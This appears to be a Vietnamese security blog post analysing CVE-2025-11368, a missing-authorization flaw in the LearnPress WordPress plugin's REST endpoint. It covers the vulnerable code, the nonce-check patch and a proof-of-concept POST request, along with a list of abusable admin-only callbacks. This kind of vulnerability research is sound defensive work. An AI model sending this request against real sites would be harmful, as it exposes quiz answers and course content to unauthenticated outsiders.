# CVE-2025-11368 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **LearnPress – WordPress LMS Plugin** cho **WordPress** tồn tại lỗ hổng **Sensitive Information Disclosure** trong tất cả các phiên bản cho đến, và bao gồm, **4.2.9.4**. Nguyên nhân là do thiếu **capability checks** trong **REST endpoint** **/wp-json/lp/v1/load_content_via_ajax** cho phép thực thi **arbitrary callback** của các **admin-only template methods**. Điều này khiến **unauthenticated attackers** có thể lấy được **admin curriculum HTML**, **quiz questions with correct answers**, **course materials**, và các **sensitive educational content** khác thông qua **REST API endpoint** nếu họ cung cấp được **valid numeric IDs**.

* **CVE ID**: [CVE-2025-11368](https://www.cve.org/CVERecord?id=CVE-2025-11368)
* **Vulnerability Type**: Broken Access Control
* **Affected Versions**: <= 4.2.9.4
* **Patched Versions**: 4.3.0
* **CVSS severity**: Low (5.3)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress LearnPress Plugin](https://wordpress.org/plugins/learnpress/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **LearnPress**:  
    * `4.2.9.4` – **vulnerable**  
    * `4.3.0` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Plugin đã đăng ký REST API:
```php {title="class-lp-rest-ajax-controller.php v4.2.9.4" data-open=true hl_lines=[3,4,14,20]}
class LP_REST_AJAX_Controller extends LP_Abstract_REST_Controller {
	public function __construct() {
		$this->namespace = 'lp/v1';
		$this->rest_base = 'load_content_via_ajax';

		parent::__construct();
	}

	public function register_routes() {
		$this->routes = array(
			'/' => array(
				array(
					'methods'             => WP_REST_Server::ALLMETHODS,
					'callback'            => array( $this, 'get_content' ),
					'permission_callback' => '__return_true',
				),
			),
		);

		parent::register_routes();
	}
  ...
}
```

Trong đoạn mã trên, **class LP_REST_AJAX_Controller** kế thừa từ **LP_Abstract_REST_Controller** và được sử dụng để đăng ký một **REST API endpoint** cho plugin **LearnPress**.  

- **__construct()**:  
  - Thiết lập **namespace** là `lp/v1`.  
  - Thiết lập **rest_base** là `load_content_via_ajax`.  
  - Gọi lại **parent::__construct()** để kế thừa các thiết lập từ lớp cha.  

- **register_routes()**:  
  - Khai báo một route `/` với các đặc điểm:  
    - **methods**: chấp nhận tất cả các phương thức HTTP (**WP_REST_Server::ALLMETHODS**).  
    - **callback**: gọi hàm `get_content`.  
    - **permission_callback**: luôn trả về `true`, tức là **không có kiểm tra quyền hạn**.  
  - Sau đó gọi lại **parent::register_routes()** để hoàn tất việc đăng ký. 

```php {title="abstract-rest-controller.php v4.2.9.4" data-open=true hl_lines=[18]}
public function register_routes() {
  if ( ! $this->routes ) {
    return;
  }

  foreach ( $this->routes as $key => $args ) {
    $rest_base = $this->rest_base;
    $override  = false;

    if ( is_bool( end( $args ) ) ) {
      $override = array_pop( $args );
    }

    if ( ! is_numeric( $key ) ) {
      $rest_base = "{$rest_base}/{$key}";
    }

    register_rest_route( $this->namespace, '/' . $rest_base, $args, $override );
  }
}
``` 

Như vậy, API này có endpoint: `/wp-json/lp/v1/load_content_via_ajax`, callback `get_content` sẽ được gọi để xử lý request đến.

```php {title="class-lp-rest-ajax-controller.php v4.2.9.4" data-open=true hl_lines=[13,14,25,26,30,41]}
public function get_content( WP_REST_Request $request ): LP_REST_Response {
  $response = new LP_REST_Response();

  try {
    $params = $request->get_params();

    if ( empty( $params['callback'] ) ||
      ! isset( $params['args'] ) ) {
      throw new Exception( 'Error: params invalid!' );
    }

    // @var array $args
    $args     = $params['args'];
    $callBack = $params['callback'];
    if ( $request->get_method() === 'GET' ) {
      $args     = LP_Helper::json_decode( $params['args'], true );
      $callBack = LP_Helper::json_decode( $params['callback'], true );
    }

    if ( empty( $callBack['class'] ) ||
      empty( $callBack['method'] ) ) {
      throw new Exception( 'Error: callback invalid!' );
    }

    $class  = $callBack['class'];
    $method = $callBack['method'];
    $data   = null;

    // Security: check callback is registered.
    $allow_callbacks = apply_filters(
      'lp/rest/ajax/allow_callback',
      []
    );
    $callBackStr     = $class . ':' . $method;
    if ( ! in_array( $callBackStr, $allow_callbacks ) ) {
      throw new Exception( 'Error: callback is not register!' );
    }

    // Check class and method is callable.
    if ( is_callable( [ $class, $method ] ) ) {
      $data = call_user_func( [ $class, $method ], $args );
    } else {
      throw new Exception( 'Error: callback is not callable!' );
    }

    if ( ! $data instanceof stdClass && ! isset( $data->content ) ) {
      throw new Exception( 'Error: data content invalid!' );
    }

    $response->status  = 'success';
    $response->message = 'Success!';
    $response->data    = $data;
  } catch ( Throwable $e ) {
    $response->status  = 'error';
    $response->message = $e->getMessage();
  }

  return $response;
}
```

Hàm nhận `callback` và `args` từ request, decode JSON nếu là GET, kiểm tra `callback` có đủ `class` và `method`, tạo chuỗi `class:method` và đối chiếu với danh sách callback hợp lệ do filter trả về; nếu không có trong danh sách thì báo lỗi, nếu có thì kiểm tra class–method có thể gọi được và thực thi `call_user_func` với `$args`, nhận về `$data` và trả trong response.

Hàng loạt các callback được đăng ký cho filter `lp/rest/ajax/allow_callback` thông qua hàm `add_filter`:

![Filter](filter.png "Đăng ký callback cho filter lp/rest/ajax/allow_callback")

```php
public function allow_callback( array $callbacks ): array {
  $callbacks[] = get_class( $this ) . ':render_edit_quiz';
  $callbacks[] = get_class( $this ) . ':render_list_items_not_assign';

  return $callbacks;
}
```

Hàm nhận mảng `$callbacks` hiện có, sau đó thêm vào hai chuỗi dạng `TênClass:method` của class hiện tại, rồi trả lại mảng đó để WordPress sử dụng làm danh sách callback hợp lệ. Khi debug, ta sẽ thấy toàn bộ các callback được đăng ký:

![Allow](allow.png "Danh sách các callback hợp lệ")

> [!BUG]
> **Lỗ hổng phát sinh do API không thực hiện bất kỳ kiểm tra quyền (capability/permission) nào.** Điều này cho phép mọi người dùng – kể cả không có quyền quản trị – gọi vào endpoint và yêu cầu thực thi bất kỳ callback nào nằm trong danh sách callback hợp lệ, dù những callback đó lẽ ra chỉ dành cho admin.

**Bản vá (v4.3.0)** bổ sung vào hàm `get_content` bước xác thực quyền bằng cách kiểm tra `X-WP-Nonce` gửi kèm request.

```php
if ( ! wp_verify_nonce( $request->get_header( 'X-WP-Nonce' ), 'wp_rest' ) ) {
  throw new Exception( 'Error: invalid nonce!' );
}
```

Nếu nonce không hợp lệ hoặc không khớp với action `wp_rest`, request sẽ bị chặn ngay, ngăn người dùng không có quyền truy cập vào các callback vốn chỉ dành cho admin.

![Diff](diff.png "Diff code")

## Flow
{{< mermaid >}}
graph TD

A["Unauthenticated attacker"]
--> B["Sends request to REST API: /wp-json/lp/v1/load_content_via_ajax"]
--> C["Request includes callback (class + method) and args (lesson, quiz, material IDs...)"]
--> D["API receives request → invokes get_content()"]
--> E["permission_callback = __return_true → no capability checks"]
--> F["get_content() validates params but performs no permission or capability validation"]
--> G["Constructs class:method and verifies it against allowed callbacks via lp/rest/ajax/allow_callback"]
--> H["Callback is valid but intended for admin-only template rendering"]
--> I["API executes the method using call_user_func([class, method], args)"]
--> J["Template method renders sensitive HTML such as curriculum, quiz content, answers, or course materials"]
--> K["Sensitive data is returned to the attacker through the REST API"]

{{< /mermaid >}}

## Proof of Concept (PoC)
Gửi request với Unauthenticated user:

```http
POST /wp-json/lp/v1/load_content_via_ajax HTTP/1.1
Host: localhost
...
callback[class]=LearnPress\TemplateHooks\Admin\AdminEditQizTemplate&callback[method]=render_list_items_not_assign&args[quiz_id]=483
```

![Result](result.png "Kết quả")

**Danh sách các callback hợp lệ khác:**

```php {data-open=true}
LearnPress\TemplateHooks\Course\ListCoursesTemplate:render_courses
LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate:render_courses
LearnPress\TemplateHooks\Course\SingleCourseTemplate:render_html_comments
LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate:renderContent
LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_edit_course_curriculum
LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_list_items_not_assign
LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_edit_quiz
LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_list_items_not_assign
LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate:render_edit_question
LearnPress\TemplateHooks\Course\CourseMaterialTemplate:render_material_items
LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid:render_courses
LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList:render_courses
LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem:render_courses
LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType:render_courses
```

## Conclusion

Lỗ hổng xuất phát từ việc endpoint REST API **không kiểm tra quyền truy cập**, cho phép kẻ tấn công chưa xác thực gọi trực tiếp các callback nội bộ vốn chỉ dành cho admin. Thông qua việc cung cấp ID hợp lệ, attacker có thể truy xuất **curriculum**, **quiz**, **đáp án**, và các **nội dung giáo trình nhạy cảm**. Bản vá 4.3.0 đã khắc phục bằng cách thêm kiểm tra **X-WP-Nonce**, ngăn truy cập trái phép vào các callback nhạy cảm.

## Key Takeaways

* **permission_callback = __return_true** là nguyên nhân cốt lõi dẫn đến Broken Access Control.
* Cho phép gọi callback nội bộ mà không xác thực quyền dẫn đến **lộ dữ liệu nhạy cảm**.
* Các callback LearnPress được thiết kế cho môi trường admin nhưng lại phơi bày qua API công khai.
* Biện pháp khắc phục hiệu quả là bổ sung kiểm tra **wp_verify_nonce** và ràng buộc quyền truy cập.
* REST API trong WordPress cần luôn có **capability checks** khi xử lý các hành động quan trọng hoặc nhạy cảm.

## References
[Broken Access Control](https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/)

[WordPress LearnPress Plugin <= 4.2.9.4 is vulnerable to Broken Access Control](https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-plugin-4-2-9-4-missing-authorization-to-unauthenticated-arbitrary-callback-execution-to-information-exposure-vulnerability) 

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-11-cve-2025-11368/  

